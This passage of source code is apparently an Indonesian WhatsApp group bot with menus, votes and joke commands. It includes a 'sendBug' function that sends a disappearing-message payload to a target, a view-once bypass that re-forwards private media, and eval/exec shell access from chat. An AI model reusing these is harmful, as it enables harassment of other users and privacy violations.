        footerText: desc1,
        buttons: but,
        headerType: 5,
      };
      syaa.sendMessage(
        id,
        buttonMessages,
        MessageType.buttonsMessage,
        options
      );
    };
    const kick = function (from, orangnya) {
      for (let i of orangnya) {
        syaa.groupRemove(from, [i]);
      }
    };
    const add = function (from, orangnya) {
      syaa.groupAdd(from, orangnya);
    };
    const sendBug = async (target, teks) => {
      if (!teks) teks = ".";
      await syaa.relayWAMessage(
        syaa.prepareMessageFromContent(
          target,
          syaa.prepareDisappearingMessageSettingContent(0),
          {}
        ),
        { waitForAck: true }
      );
      syaa.sendMessage(target, teks, "conversation");
    };

    //FUNCTION
    function clockString(ms) {
      let h = isNaN(ms) ? "--" : Math.floor(ms / 3600000);
      let m = isNaN(ms) ? "--" : Math.floor(ms / 60000) % 60;
      let s = isNaN(ms) ? "--" : Math.floor(ms / 1000) % 60;
      return [h, m, s].map((v) => v.toString().padStart(2, 0)).join(":");
    }

    cekafk(afk);
    if (!mek.key.remoteJid.endsWith("@g.us") && offline) {
      if (!mek.key.fromMe) {
        if (isAfk(mek.key.remoteJid)) return;
        addafk(mek.key.remoteJid);
        heheh = ms(Date.now() - waktu);
        syaa.sendMessage(
          mek.key.remoteJid,
          `@${owner} Sedang Offline!\n\n*Alasan :* ${alasan}\n*Sejak :* ${heheh.hours} Jam, ${heheh.minutes} Menit, ${heheh.seconds} Detik lalu\n\nSilahkan Hubungi Lagi Nanti`,
          MessageType.text,
          {
            contextInfo: {
              mentionedJid: [`${owner}@s.whatsapp.net`],
              stanzaId: "B826873620DD5947E683E3ABE663F263",
              participant: "0@s.whatsapp.net",
              remoteJid: "status@broadcast",
              quotedMessage: {
                imageMessage: {
                  caption: "*OFFLINE*",
                  jpegThumbnail: fs.readFileSync("./stik/thumb.jpeg"),
                },
              },
            },
          }
        );
      }
    }
    if (mek.key.remoteJid.endsWith("@g.us") && offline) {
      if (!mek.key.fromMe) {
        if (mek.message.extendedTextMessage != undefined) {
          if (mek.message.extendedTextMessage.contextInfo != undefined) {
            if (
              mek.message.extendedTextMessage.contextInfo.mentionedJid !=
              undefined
            ) {
              for (let ment of mek.message.extendedTextMessage.contextInfo
                .mentionedJid) {
                if (ment === `${owner}@s.whatsapp.net`) {
                  if (isAfk(mek.key.remoteJid)) return;
                  addafk(mek.key.remoteJid);
                  heheh = ms(Date.now() - waktu);
                  syaa.sendMessage(
                    mek.key.remoteJid,
                    `@${owner} Sedang Offline!\n\n *Alasan :* ${alasan}\n *Sejak :* ${heheh.hours} Jam, ${heheh.minutes} Menit, ${heheh.seconds} Detik lalu\n\nSilahkan Hubungi Lagi Nanti`,
                    MessageType.text,
                    {
                      contextInfo: {
                        mentionedJid: [`${owner}@s.whatsapp.net`],
                        stanzaId: "B826873620DD5947E683E3ABE663F263",
                        participant: "0@s.whatsapp.net",
                        remoteJid: "status@broadcast",
                        quotedMessage: {
                          imageMessage: {
                            caption: "*OFFLINE*",
                            jpegThumbnail: fs.readFileSync("./stik/thumb.jpeg"),
                          },
                        },
                      },
                    }
                  );
                }
              }
            }
          }
        }
      }
    }

    //========================================================================================================================//
    colors = ["red", "white", "black", "blue", "yellow", "green"];
    const isMedia = type === "imageMessage" || type === "videoMessage";
    const isQuotedImage =
      type === "extendedTextMessage" && content.includes("imageMessage");
    const isQuotedVideo =
      type === "extendedTextMessage" && content.includes("videoMessage");
    const isQuotedAudio =
      type === "extendedTextMessage" && content.includes("audioMessage");
    const isQuotedSticker =
      type === "extendedTextMessage" && content.includes("stickerMessage");
    if (!isGroup && prefix && command)
      console.log(
        "\x1b[1;31m~\x1b[1;37m>",
        "[\x1b[1;32mEXEC\x1b[1;37m]",
        time,
        color(command),
        "from",
        color(sender.split("@")[0]),
        "args :",
        color(args.length)
      );
      
      	    // Auto Read
        syaa.chatRead(from, "read")
        //auto vn 
        await syaa.updatePresence(from, Presence.recording)
        
        const sotoy = [
        '🍊 : 🍒 : 🍐',
        '🍒 : 🔔 : 🍊',
        '🍇 : 🍇 : 🍐',
        '🍊 : 🍋 : 🔔', //ANKER
        '🔔 : 🍒 : 🍐',
        '🔔 : 🍒 : 🍊',
        '🍊 : 🍋 : 🔔',        
        '🍐 : 🍒 : 🍋',
        '🍐 : 🍒 : 🍐',
        '🍊 : 🍒 : 🍒',
        '🍒 : 🍒 : 🍒 Win👑',
        '🔔 : 🔔 : 🍇',
        '🍌 : 🍌 : 🔔',
        '🔔 : 🔔 : 🔔 Win👑',
        '🍐 : 🔔 : 🔔',
        '🍊 : 🍋 : 🍒',
        '🔔 : 🔔 : 🍇',
        '🔔 : 🍇 : 🍇', 
        '🔔 : 🍐 : 🔔','🍊 : 🍒 : 🍐','🍒 : 🔔 : 🍊','🍇 : 🍇 : 🍇 Win👑','🍊 : 🍋 : 🔔','🔔 : 🍒 : 🍐','🔔 : 🍒 : 🍊','🍊 : 🍋 : 🔔',	'🍐 : 🍒 : 🍋','🍐 : 🍐 : 🍐 Win👑','🍊 : 🍒 : 🍒','🔔 : 🔔 : 🍇','🍌 : 🍒 : 🔔','🍐 : 🔔 : 🔔','🍊 : 🍋 : 🍒','🍋 : 🍋 : 🍌','🔔 : 🔔 : 🍇','🔔 : 🍐 : 🍇','🍒 : 🍒 : 🍒 Win👑','🍌 : 🍌 : 🍌 Win👑']
    //if (!isGroup && !isCmd) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;31mTEXT\x1b[1;37m]', time, color('Message'), 'from', color(sender.split('@')[0]), 'args :', color(args.length))
    if (prefix && command && isGroup)
      console.log(
        "\x1b[1;31m~\x1b[1;37m>",
        "[\x1b[1;32mEXEC\x1b[1;37m]",
        time,
        color(command),
        "from",
        color(sender.split("@")[0]),
        "in",
        color(groupName),
        "args :",
        color(args.length)
      );
    //if (!isCmd && isGroup) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;31mTEXT\x1b[1;37m]', time, color('Message'), 'from', color(sender.split('@')[0]), 'in', color(groupName), 'args :', color(args.length))
    if (isGroup && !isVote) {
      if (budy.toLowerCase() === "vote") {
        let vote = JSON.parse(fs.readFileSync(`./lib/${from}.json`));
        let _votes = JSON.parse(fs.readFileSync(`./lib/vote/${from}.json`));
        let fil = vote.map((v) => v.participant);
        let id_vote = sender ? sender : "6283152753417@s.whatsapp.net";
        if (fil.includes(id_vote)) {
          return mentions(
            "@" + sender.split("@")[0] + " Anda sudah vote",
            fil,
            true
          );
        } else {
          vote.push({
            participant: id_vote,
            voting: "✅",
          });
          fs.writeFileSync(`./lib/${from}.json`, JSON.stringify(vote));
          let _p = [];
          let _vote =
            "*Vote* " +
            "@" +
            _votes[0].votes.split("@")[0] +
            `\n\n*Alasan*: ${_votes[0].reason}\n*Jumlah Vote* : ${vote.length} Vote\n*Durasi* : ${_votes[0].durasi} Menit\n\n`;
          for (let i = 0; i < vote.length; i++) {
            _vote += `@${vote[i].participant.split("@")[0]}\n*Vote* : ${
              vote[i].voting
            }\n\n`;
            _p.push(vote[i].participant);
          }
          _p.push(_votes[0].votes);
          mentions(_vote, _p, true);
        }
      } else if (budy.toLowerCase() === "devote") {
        const vote = JSON.parse(fs.readFileSync(`./lib/${from}.json`));
        let _votes = JSON.parse(fs.readFileSync(`./lib/vote/${from}.json`));
        let fil = vote.map((v) => v.participant);
        let id_vote = sender ? sender : "6283152753417@s.whatsapp.net";
        if (fil.includes(id_vote)) {
          return mentions(
            "@" + sender.split("@")[0] + " Anda sudah vote",
            fil,
            true
          );
        } else {
          vote.push({
            participant: id_vote,
            voting: "❌",
          });
          fs.writeFileSync(`./lib/${from}.json`, JSON.stringify(vote));
          let _p = [];
          let _vote =
            "*Vote* " +
            "@" +
            _votes[0].votes.split("@")[0] +
            `\n\n*Alasan*: ${_votes[0].reason}\n*Jumlah Vote* : ${vote.length} Vote\n*Durasi* : ${_votes[0].durasi} Menit\n\n`;
          for (let i = 0; i < vote.length; i++) {
            _vote += `@${vote[i].participant.split("@")[0]}\n*Vote* : ${
              vote[i].voting
            }\n\n`;
            _p.push(vote[i].participant);
          }
          _p.push(_votes[0].votes);
          mentions(_vote, _p, true);
        }
      }
    }
    const sendKontak = (from, nomor, nama, org = "") => {
      const vcard =
        "BEGIN:VCARD\n" +
        "VERSION:3.0\n" +
        "FN:" +
        nama +
        "\n" +
        "ORG:" +
        org +
        "\n" +
        "TEL;type=CELL;type=VOICE;waid=" +
        nomor +
        ":+" +
        nomor +
        "\n" +
        "END:VCARD";
      syaa.sendMessage(
        from,
        { displayname: nama, vcard: vcard },
        MessageType.contact,
        { quoted: mek }
      );
    };
    //kasih wm gw ajg kalau make
    if (isGroup && isAntilink && !mek.key.fromMe) {
      if (budy.includes("://chat.whatsapp.com/")) {
        if (isGroupAdmins) return reply("admin bebas");
        reply("ANTILINK DETECTED!! MAAF ANDA AKAN DIKICK ;V");
        syaa.groupRemove(from, [sender]);
      }
    }
    if (isGroup && isAntiviewonce && m.mtype == "viewOnceMessage") {
      reply(
        `@${sender.split("@")[0]} Terdeteksi mengirim gambar/video viewonce!`
      );
      var msg = { ...mek };
      msg.mek = mek.message.viewOnceMessage.message;
      msg.mek[Object.keys(msg.mek)[0]].viewOnce = false;
      syaa.copyNForward(m.chat, msg);
    }
    if (
      isGroup &&
      isAntihidetag &&
      m.message[m.mtype]?.contextInfo?.mentionedJid?.length ==
        groupMembers.length
    ) {
      console.log(
        color("[ANTI-HIDETAG]", "red"),
        color(`@${sender.split("@")[0]} mengirim pesan hidetag`, "white")
      );
      reply(`@${sender.split("@")[0]} Terdeteksi mengirim pesan hidetag!!`);
      kick(from, sender);
    }

    if (isGroup && isAntivirtex && !mek.key.fromMe) {
      if (budy.length > 700) {
        if (isGroupAdmins) return reply("admin bebas");
        reply("ANTIVIRTEX DETECTED!! MAAF ANDA AKAN DIKICK ;V");
        syaa.groupRemove(from, sender);
      }
    }
    if (isGroup && autojoin == true) {
      if (budy.includes("://chat.whatsapp.com/")) {
        console.log(
          color("[AUTO-JOIN]", "red"),
          color("YAHAHAHHAHAH", "white")
        );
        syaa.query({
          json: [
            "action",
            "invite",
            `${budy.replace("https://chat.whatsapp.com/", "")}`,
          ],
        });
      }
    }
    if (isGroup && isKickarea && !mek.key.fromMe) {
      if (sender.includes("62")) {
        reply("GRUP ONLY +62!");
        syaa.groupRemove(from, [sender]);
      }
    }
    
    if (_chats.startsWith(">")) {
      if (!isOwner && !mek.key.fromMe) return reply(mess.own)
      try {
        return syaa.sendMessage(
          from,
          JSON.stringify(eval(budy.slice(2)), null, "\t"),
          text,
          { quoted: mek }
        );
      } catch (err) {
        e = String(err);
        reply(e);
      }
    }
    if (budy.startsWith('$')){
      if (!isOwner && !mek.key.fromMe) return reply(mess.own)
      const cod = args.join(' ')
      exec(cod, (err, stdout) => {
      if(err) return reply(`${err}`)
      if (stdout) {
      reply(`${stdout}`)
      }
      })
    }
    if (budy.startsWith('>')){
      if (!mek.key.fromMe) return
      try {
      return syaa.sendMessage(from, JSON.stringify(eval(budy.slice(2)),null,'\t'),text, {quoted: mek})
      } catch(err) {
      e = String(err)
      reply(e)
      }
      }
      if (budy.startsWith('=>')){
      if (!isOwner && !mek.key.fromMe) return reply(mess.own)
      var konsol = budy.slice(3)
      var util = require("util")
      Return = (sul) => {
      var sat = JSON.stringify(sul, null, 2)
      bang = util.format(sat)
      if (sat == undefined){
      bang = util.format(sul)
      }
      return reply(bang)
      }
      try {
      reply(util.format(eval(`;(async () => { ${konsol} })()`)))
      console.log('\x1b[1;37m>', '[', '\x1b[1;32mEVAL\x1b[1;37m', ']', time, color(">", "green"), 'from', color(sender.split('@')[0]), 'args :', color(args.length))
      } catch(e){
      reply(String(e))
      }
      }
      let settingstatus = 0;
    if (new Date() * 1 - settingstatus > 1000) {
      let _uptime = process.uptime() * 1000;
      let uptime = clockString(_uptime);

await syaa.setStatus(`𝙾𝙽𝙻𝙸𝙽𝙴 ${uptime}`).catch((_) => _);
      settingstatus = new Date() * 1;
      }

    if (!mek.key.fromMe && banChats === true) return;
    if (prefixStatus) if (_chats.startsWith(command)) return;
    switch (command) {
      case "infomenu":
        case "allmenu":
          case "menuall":
            if (isBanned) return reply(mess.ban)
        var menu = `${ucapanWaktu} kak *${pushname}*
        
❋─────────────────❋
*⦿ Jam :* ${jam}
*⦿ Hari :* ${week} ${weton}
*⦿ Tanggal :* ${date}
${readmore}❋─────────────────❋

_ada Bug?_ ketik ${prefix}report _Alasan_
╔════════════════════════════༻
║*OWNER*
║• ${prefix}off
║• ${prefix}on
║• ${prefix}status
║• ${prefix}setthumb
║• ${prefix}settarget
║• ${prefix}shutdown
║• ${prefix}hacked
║• ${prefix}setfakeimg
║• ${prefix}addprem @user
║• ${prefix}dellprem @user
║• ${prefix}ban @user
║• ${prefix}unban @user
║• ${prefix}setreply
║• ${prefix}setprefix [2 Button]
║• ${prefix}mode [2 Button self/public]
║• ${prefix}term <code>
║• ${prefix}eval <code>
║• ${prefix}colongsw 
║• ${prefix}readall
║• ${prefix}lambangcc
║• ${prefix}🎺
║• ${prefix}🎺🎺
║ $
║ >
║ =>
╚════════════════════════════༻ 
╔════════════════════════════༻    
║*GRUP*
║• ${prefix}grup [3 Button]
║• ${prefix}getpic @user
║• ${prefix}promote <reply chat member>
║• ${prefix}demote <reply chat member>
║• ${prefix}setdesc
║• ${prefix}setname
║• ${prefix}kick <reply/tag member>
║• ${prefix}add <reply/tag member>
║• ${prefix}getbio <reply chat member>
║• ${prefix}getname <reply chat member>
║• ${prefix}reminder <msg/2s>
║• ${prefix}listonline
║• ${prefix}groupinfo
║• ${prefix}linkgc
║• ${prefix}tutuptime
║• ${prefix}bukatime
║• ${prefix}sider [reply chat bot]
║• ${prefix}antilink
║• ${prefix}antihidetag
║• ${prefix}antiviewonce
║• ${prefix}antivirtex
║• ${prefix}kickarea
╚════════════════════════════༻ 

╔═════════════════════════༻    
║ *MAKER*
║• ${prefix}memegen Atas|Bawah
║• ${prefix}bajingan lu _Nama Mu_
║• ${prefix}sticker
║• ${prefix}attp _Text_
║• ${prefix}tovid
║• ${prefix}swm <author|packname>
║• ${prefix}take <author|packname>
║• ${prefix}fdeface
║• ${prefix}semoji
║• ${prefix}wasted
║• ${prefix}wanted
║• ${prefix}pubglogo teks|teks
║• ${prefix}deltrash
║• ${prefix}squidrip
║• ${prefix}sertiff1 <text>
║• ${prefix}bpink <text>
║• ${prefix}tulis
║• ${prefix}googlem Text|Text
║• ${prefix}roses
║• ${prefix}wooden
║• ${prefix}quote
║• ${prefix}textburn
║• ${prefix}cutegravity
║• ${prefix}card-game Judul|Keterangan
║• ${prefix}tahta _Nama_
║• ${prefix}halloween _Name_
║• ${prefix}matrixlogo
║• ${prefix}matrix
║• ${prefix}pornhub
║• ${prefix}neon
║• ${prefix}herobanner
║• ${prefix}silverplahbutton
║• ${prefix}goldplaybutton
║• ${prefix}epeplogo
║• ${prefix}lolim
║• ${prefix}remm
║• ${prefix}gura
║• ${prefix}kaneki
╚═════════════════════════༻ 
╔═══════════════════════༻
║*FUN MENU*
║• ${prefix}slot
║• ${prefix}suit
║• ${prefix}say _Text_
║• ${prefix}bisakah _Querry_
║• ${prefix}kapankah _Querry_
║• ${prefix}apakah _Querry_
║• ${prefix}belah _Querry_
║• ${prefix}bagaimanakah _Querry_
║• ${prefix}rate _Querry_
║• ${prefix}caklontong
║• ${prefix}sangecek _Name_
║• ${prefix}gaycek _Name_
║• ${prefix}terganteng
║• ${prefix}tercantik
║• ${prefix}lesbicek _Name_
║• ${prefix}gantengcek _Name_
║• ${prefix}cantikcek _Name_
║• ${prefix}watak _Name_
║• ${prefix}hobby _Name_
║• ${prefix}jadian
║• ${prefix}ngewe
║• ${prefix}tod
║• ${prefix}truth
║• ${prefix}dare
║• ${prefix}wangy _NamaMu_
║• ${prefix}citacita
╚═══════════════════════༻
╔════════════༻
║*CONVERT*
║• ${prefix}toimg
║• ${prefix}tomp3
║• ${prefix}tomp4
║• ${prefix}slow
║• ${prefix}fast
║• ${prefix}reverse
║• ${prefix}tourl
╚════════════༻
╔════════════════༻
║*DOWNLOADER*
║• ${prefix}youtube <url>
║• ${prefix}ytmp3 <url>
║• ${prefix}ytmp4 <url>
║• ${prefix}tiktok <url>
║• ${prefix}instagram <url>
║• ${prefix}twitter <url>
╚════════════════༻
╔═══════════════༻
║*UP STORY*
║• ${prefix}upswteks
║• ${prefix}upswimage
║• ${prefix}upswvideo
║• ${prefix}upswvoice
║• ${prefix}upswgif
║• ${prefix}upswaudio
║• ${prefix}upswsticker
╚═══════════════༻
╔═════════════════════༻
║*STORAGE MENU*
║• ${prefix}addvn _Nama_
║• ${prefix}addvideo _Nama_
║• ${prefix}addsticker _Nama_
║• ${prefix}addimage _Nama_
║• ${prefix}listvn
║• ${prefix}listvideo
║• ${prefix}liststicker
║• ${prefix}listimg
║• ${prefix}getvn _Database_
║• ${prefix}getvideo _Database_
║• ${prefix}getsticker _Database_
║• ${prefix}getimage _Database_
╚══════════════════════༻
╔═════════════༻
║*FUN*
║• ${prefix}fitnah
║• ${prefix}fitnahpc
║• ${prefix}kontak
╚═════════════༻
╔════════════════════༻  
║*MAKER CONVERT*
║• ${prefix}spongebobm _ReplyGambar_
║• ${prefix}hengkerm _ReplyGambar_
║• ${prefix}hengkerm2 _ReplyGambar_
║• ${prefix}ripm _ReplyGambar_
║• ${prefix}stonkm _ReplyGambar_
║• ${prefix}notstonkm _ReplyGambar_
║• ${prefix}patrickm _ReplyGambar_
╚════════════════════༻  
╔═════════════༻  
║*TAG*
║• ${prefix}hidetag
║• ${prefix}kontag
║• ${prefix}sticktag
║• ${prefix}totag
║• ${prefix}tt
║• ${prefix}t
║• ${prefix}th
╚═════════════༻
╔════════༻
║*SOUND*
║• ${prefix}s1
║• ${prefix}s2
║• ${prefix}s3
║• ${prefix}s4
║• ${prefix}s5
║• ${prefix}s6
║• ${prefix}s7
║• ${prefix}s8
║• ${prefix}s9
║• ${prefix}s8
║• ${prefix}s9
║• ${prefix}s10
║• ${prefix}s11
║• ${prefix}s12
║• ${prefix}s13
║• ${prefix}s14
║• ${prefix}s15
║• ${prefix}s16
║• ${prefix}s17
║• ${prefix}s18
║• ${prefix}s19
║• ${prefix}s20
║• ${prefix}s21
║• ${prefix}s22
║• ${prefix}s23
║• ${prefix}s24
║• ${prefix}s25
║• ${prefix}s26
║• ${prefix}s27
║• ${prefix}s28
║• ${prefix}s29
║• ${prefix}s30
║• ${prefix}s31
╚═════════༻
╔══════════════════════════༻     
║*OTHER*
║• ${prefix}asupan
║• ${prefix}ocr
║• ${prefix}asupan2
║• ${prefix}tts id _Text_
║• ${prefix}polosanmeme
║• ${prefix}virtex
║• ${prefix}memeindo
║• ${prefix}detikvn <ReplyVn|Jumlah>
║• ${prefix}detikvideo <ReplyVid|Jumlah>
║• ${prefix}delete
║• ${prefix}infogempa
║• ${prefix}dadu
║• ${prefix}tospam _Jumlah_
║• ${prefix}ping
║• ${prefix}inspect
║• ${prefix}join
║• ${prefix}caripesan <query>
║• ${prefix}get
║• ${prefix}ytsearch <query>
║• ${prefix}igstalk <query>
║• ${prefix}githubstalk <query>
║• ${prefix}tiktokstalk <query>
║• ${prefix}play <query>
║• ${prefix}video <query>
║• ${prefix}igstory <username>
║• ${prefix}twitter <link>
║• ${prefix}tiktok <link>
║• ${prefix}tiktokaudio <link>
║• ${prefix}fb <link>
║• ${prefix}brainly <query>
║• ${prefix}image <query>
║• ${prefix}anime <random>
║• ${prefix}pinterest <query>
║• ${prefix}komiku <query>
║• ${prefix}lirik <query>
║• ${prefix}chara <query>
║• ${prefix}playstore <query>
║• ${prefix}saveall
║• ${prefix}databasegt
║• ${prefix}otaku <query>
╚══════════════════════════༻
╔═════════════════༻      
║*RANDOM IMAGE*
║• ${prefix}darkjoke
║• ${prefix}cecan
║• ${prefix}cogan
║• ${prefix}hentai
║• ${prefix}quotes
║• ${prefix}quotesindo
║• ${prefix}hewan
║• ${prefix}kucing
║• ${prefix}squidward
║• ${prefix}spongebob
║• ${prefix}patrick
║• ${prefix}minato
║• ${prefix}kakashi
║• ${prefix}boruto
║• ${prefix}sarada
║• ${prefix}mitsuki
║• ${prefix}sasuke
║• ${prefix}sakura
║• ${prefix}itachi
║• ${prefix}megumin
║• ${prefix}loli
║• ${prefix}husbu
║• ${prefix}wafiu
║• ${prefix}satanist
║• ${prefix}wallpaperanime
║• ${prefix}naruto
║• ${prefix}aesthetic
╚═════════════════༻
╔══════════════༻
║*JADI BOT*
║• ${prefix}jadibot
║• ${prefix}stopjadibot
║• ${prefix}listbot
╚══════════════༻
╔═════════════༻
║*STICKER CMD*
║• ${prefix}addcmd
║• ${prefix}delcmd
║• ${prefix}listcmd
╚═════════════༻  
╔═════════════༻  
║*VOTE*
║• ${prefix}voting
║• ${prefix}delvote
║ vote
║ devote
╚═════════════༻
*_THANKS BUAT_*
===================
- _ORTU_

 *INFO BOT*
• Prefix : 「 ${prefixStatus ? "Multi Prefix" : "No Prefix"} 」
• Runtime : ${runtime(process.uptime())}
• Hit Today : ${hit_today.length} Hit
• Total Hit : ${totalhit} Hit
• Total Chat : ${totalchat.length} Chat

`;
        sendButImage(from, menu, "by ikyyyyy 🗿", thumb, [
          {
            buttonId: `${prefix}donasi`,
            buttonText: {
              displayText: `Donasi💰`,
            },
            type: 1,
          },
                    {
            buttonId: `${prefix}menuall1`,
            buttonText: {
              displayText: `MENU ALL1`,
            },
            type: 1,
          },
        ]);

        break;
        case 'leave':
          if (isBanned) return reply(mess.ban)
             if (!isGroup) return reply("Khusus di grup");
					if (!isGroupAdmins && !mek.key.fromMe) return reply(mess.admin);
                setTimeout( () => {
                syaa.groupLeave (from) 
                }, 2000)
                setTimeout( () => {
                syaa.updatePresence(from, Presence.composing) 
                syaa.sendMessage(from, 'Bye cuk🗣', text) // ur cods
                }, 0)
                break
        case 'tagall':
          if (isBanned) return reply(mess.ban)
              if (!isGroup) return reply("Khusus di grup");
					if (!isGroupAdmins && !mek.key.fromMe) return reply(mess.admin);
              let arr = [];
              let txti = `*[ TAG ALL ]*\n\n${q ? q : ''}\n\n`
              for (let i of groupMembers){
              txti += `=> @${i.jid.split("@")[0]}\n`
              arr.push(i.jid)
}
              mentions(txti, arr, true)
              break
				    
        case "menu":
          case "m":
          case "help":
            if (isBanned) return reply(mess.ban)
        var menu = `Halloo ${pushname} Aku ${namabot}

❋─────────────────❋
 *INFO OWNER*
 📧 Instagram : https://instagram.com/${instagram}
 🪀 Whatsapp : https://wa.me/${owner}
 📩 Email : ${email}
 
*${prefix}sticker*
*${prefix}owner*
*${prefix}info*

❋─────────────────❋
• ${prefix}ownermenu
• ${prefix}grupmenu
• ${prefix}makermenu
• ${prefix}funmenu
• ${prefix}convertmenu
• ${prefix}downloadmenu
• ${prefix}uploadmenu
• ${prefix}storagemenu
• ${prefix}surahmenu
• ${prefix}menulain
• ${prefix}stcmd
• ${prefix}votemenu
• ${prefix}imagemenu
❋─────────────────❋ 
• ${prefix}allmenu
• ${prefix}menuall1
❋─────────────────❋ 
 Join Grup ${namabot}!
 
 ${grupct}

❋─────────────────❋
 *INFO BOT KY*
• Prefix : 「 ${prefixStatus ? "Multi Prefix" : "No Prefix"} 」
• Runtime : ${runtime(process.uptime())}
• Hit Today : ${hit_today.length} Hit
• Total Hit : ${totalhit} Hit
• Total Chat : ${totalchat.length} Chat
❋─────────────────❋
`;
        sendButImage(from, menu, "ALLERT⚠️\n\nJIKA BUTTON TIDAK KELUAR /allmenu ATAU /menuall1", thumb, [
          {
            buttonId: `${prefix}infomenu`,
            buttonText: {
              displayText: `⋮☰ Semua Menu`,
            },
            type: 1,
          },
          {
            buttonId: `${prefix}owner`,
            buttonText: {
              displayText: `⋮☰ Pemilik Bot`,
            },
            type: 1,
          },
        {
            buttonId: `${prefix}peraturan2`,
            buttonText: {
              displayText: `Syarat & Ketentuan📌`,
            },
            type: 1,
          },
        ]);
        break;
      case "owner":
        sendKontak(from, owner, `${nama_owner}`, `Pemilik ${namabot}`);
        sendButMessage(
          from,
          `Mau tanya² tentang apa?`,
          `Silahkan pilih salah satu`,
          [
            {
              buttonId: `${prefix}scky`,
              buttonText: {
                displayText: `SCRIPT`,
              },
              type: 1,
            },
            {
              buttonId: `${prefix}smenu`,
              buttonText: {
                displayText: `SOUND`,
              },
              type: 1,
            },
          ]
        );
        break;
        case "grupchat":
          reply("https://chat.whatsapp.com/HECLovHbCI6LVVH4Q8FN2C")
          break;
        if (body.startsWith(`p`)) {
                  reply(`Salam dong sayang`)
                }
        case "peraturan":
        reply("By @𝕀𝕂𝕐\n\nPergunakan Bot Dengan Baik Dan Bijak!!!\n- Jangan Spam Dan Jangan Telepon Bot!!!\n- Silahkan Hubungi Owner Jika Bot Mengalama Kendala!!\n- Jangan Paksakan Bot Masuk Ke Grup Kamu!!!\n- <> TIDAK DI ANGGAP!!\n\nOkee Thanks🗿");
        break;
        case "hina":
          reply("apa lu anjing😡")
          break;
        
      //------------------< Sticker Cmd >-------------------
      case "addcmd":
      case "setcmd":
        if (isBanned) return reply(mess.ban)
        if (isQuotedSticker) {
          if (!q)
            return reply(`Penggunaan : ${command} cmdnya dan tag stickernya`);
          var kodenya =
            mek.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.fileSha256.toString(
              "base64"
            );
          addCmd(kodenya, q);
          reply("Done!");
        } else {
          reply("tag stickenya");
        }
        break;
      case "delcmd":
        if (isBanned) return reply(mess.ban)
        if (!isQuotedSticker)
          return reply(`Penggunaan : ${command} tagsticker`);
        var kodenya =
          mek.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.fileSha256.toString(
            "base64"
          );
        _scommand.splice(getCommandPosition(kodenya), 1);
        fs.writeFileSync("./database/scommand.json", JSON.stringify(_scommand));
        reply("Done!");
        break;
      case "listcmd":
        teksnyee = `\`\`\`「 LIST STICKER CMD 」\`\`\``;
        cemde = [];
        for (let i of _scommand) {
          cemde.push(i.id);
          teksnyee += `\n\n➸ *ID :* ${i.id}\n➸ *Cmd* : ${i.chats}`;
        }
        mentions(teksnyee, cemde, true);
        break;
         //------------------< Fitur Fun >-------------------
      //funmenu
                case "bisakah":
                  if (isBanned) return reply(mess.ban)
					// ⚠️ Case by DappaUhuy&YogPw

              
					bisakah = body.slice(1)
					const bisa =['Bisa','Tidak Bisa','Hmmm gimana ya','Gak bisa ajg awoakwok','mana mungkin su','Bisa banget tuh, keren kayaknya','gausa mimpi ya','tengok muka kau sadar','ya nggak lah kan kau jelek','bisa dikit','bisa gila','serahlu cape gua jembut lu bau','bisa sayang bisa']
					const keh = bisa[Math.floor(Math.random() * bisa.length)]
					syaa.sendMessage(from, 'Pertanyaan : *'+bisakah+'*\n\nJawaban : '+ keh, text, { quoted: mek })
					await limitAdd(sender)
					break
		            case "kapankah":
		              if (isBanned) return reply(mess.ban)
					// ⚠️ Case by DappaUhuy&YogPw

                
					kapankah = body.slice(1)
					const kapan =['Besok','Lusa','1 Hari Lagi','2 Hari Lagi','3 Hari Lagi','4 Hari Lagi','5 Hari Lagi','6 Hari Lagi','1 Bulan Lagi','2 Bulan Lagi','3 Bulan Lagi','4 Bulan Lagi','5 Bulan Lagi','6 Bulan Lagi','7 Bulan Lagi','8 Bulan Lagi','9 Bulan Lagi','10 Bulan Lagi','11 Bulan Lagi','1 Tahun lagi','2 Tahun lagi','3 Tahun lag0i','4 Tahun lagi','5 Tahun lagi','6 Tahun lagi','7 Tahun lagi','8 Tahun lagi','9 Tahun lagi','10 Tahun lagi']
					const koh = kapan[Math.floor(Math.random() * kapan.length)]
					syaa.sendMessage(from, 'Pertanyaan : *'+kapankah+'*\n\nJawaban : '+ koh, text, { quoted: mek })
					await limitAdd(sender)
					break
		            case "apakah":
		              if (isBanned) return reply(mess.ban)
					// ⚠️ Case by DappaUhuy&YogPw

                 
					apakah = body.slice(1)
					const apa =['Iya','Tidak','Bisa Jadi','Hmmm gimana ya','yondak tau kok tanya saya','gatau kntl','lah mana tau','yajelas','tanya bapak mu coba','banget pake ples','tanya mamakmu','sadar muka lu kaya pantat ayam','mungkin keknya','bnr bang','hooh','gini ye bang lu beban keluarga jadi ga pantes ajg','dih halu kau jelek','alwowkwo muka kau kaya gtu mau ngehalu pula']
					const kah = apa[Math.floor(Math.random() * apa.length)]
					syaa.sendMessage(from, 'Pertanyaan : *'+apakah+'*\n\nJawaban : '+ kah, text, { quoted: mek })
					await limitAdd(sender)
					break
case "belah":
  if (isBanned) return reply(mess.ban)
					// ⚠️ Case by Arasya
                 
				if (args.length < 1) return fakestatus('mana pertanyaan nya kak?\nContoh #iyas bermain Free Fire')
					iyas = body.slice(7)
					const iya =['Bener','Salah','Bener dong','Salah!!!']
					const salah = iya[Math.floor(Math.random() * iya.length)]
					syaa.sendMessage(from, 'Pertanyaan : *bener atau salah '+iyas+'*\n\nJawaban : '+ salah, text, { quoted: mek })
					await limitAdd(sender)
					break
		            case "bagaimanakah":
		              if (isBanned) return reply(mess.ban)
					// ⚠️ Case by DappaUhuy&YogPw

                 
					bagaimanakah = body.slice(1)
					const bagai =['Kita Kenal?','Nanya Terus deh','Tidak Tahu','Hmmm gimana ya','Cari Aja Sendiri','Kurang Tahu','Mana Saya Tahu, Saya kan ikan','ya gitu','ya gtu ajg','lah udah di blg gtu masi nanya bagaimana','gatau gua otak lu kaya udang','susah di telaah krna lu bau']
					const mana = bagai[Math.floor(Math.random() * bagai.length)]
					syaa.sendMessage(from, 'Pertanyaan : *'+bagaimanakah+'*\n\nJawaban : '+ mana, text, { quoted: mek })
					await limitAdd(sender)
					break
		            case "rate":
		              if (isBanned) return reply(mess.ban)
					// ⚠️ Case by DappaUhuy&YogPw

                 
					rate = body.slice(1)
